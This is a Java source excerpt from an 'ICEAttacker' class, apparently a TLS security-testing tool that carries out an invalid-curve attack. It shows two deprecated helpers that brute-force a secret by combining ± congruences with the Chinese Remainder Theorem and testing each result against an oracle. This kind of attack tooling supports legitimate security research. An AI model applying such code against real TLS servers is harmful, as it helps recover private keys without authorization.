...
public class ICEAttacker {
    ...
    /**
     * As a result of the attack against TLS, we get the following equations: x
     * == +/- a_i mod n_i
     * 
     * Thus, we need to execute a brute force search with all (+/- a_i) values
     * to get a valid secret.
     * 
     * @param congs
     * @param modulis
     * @param i
     */
    @Deprecated
    private void bruteForceWithCRT(BigInteger[] congs, BigInteger[] modulis, int i) {
	if (result == null) {
	    if (i == (congs.length - 1)) {
		iteration++;
		BigInteger testResult = MathHelper.CRT(congs, modulis);
		if (oracle.isFinalSolutionCorrect(testResult)) {
		    result = testResult;
		}
		testResult = MathHelper.CRT(invertCongInArray(congs, modulis, i), modulis);
		if (oracle.isFinalSolutionCorrect(testResult)) {
		    result = testResult;
		}
		if (iteration % 50000 == 0) {
		    LOGGER.info("Tested {} values so far", iteration * 2);
		}
	    } else {
		bruteForceWithCRT(congs, modulis, i + 1);
		bruteForceWithCRT(invertCongInArray(congs, modulis, i), modulis, i + 1);
	    }
	}
    }

    /**
     * Computes (order-congruence) for a specific element in the congruence
     * array: For example, if x == a_i mod n_i, this function returns an array
     * where a_i = (n_i-a_i)
     * 
     * @param congs
     * @param modulis
     ...
     */
    @Deprecated
    private BigInteger[] invertCongInArray(BigInteger[] congs, BigInteger[] modulis, int i) {
	BigInteger[] res = Arrays.copyOf(congs, congs.length);
	res[i] = modulis[i].subtract(res[i]);
	return res;
    }
}
